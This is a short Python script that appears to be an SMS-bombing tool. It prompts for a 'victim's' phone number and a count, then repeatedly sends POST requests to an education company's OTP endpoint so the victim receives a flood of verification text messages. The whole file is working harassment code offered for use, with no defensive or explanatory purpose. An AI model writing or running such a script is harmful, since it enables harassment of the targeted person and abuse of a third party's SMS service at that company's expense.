import requests

#POST 



a=str(input("Enter your victim's namber : "))
b=str("'"+a+"'")
myblapi="https://dev.10minuteschool.com/api/v4/auth/sendOtp?contact="+a
number="{'mobile':" + b+"}"


amount=int(input("Enter The Amount : "))

for i in range(amount):
	requests.post(myblapi,
data=number)
	print(str(i+1)+" SMS Sent")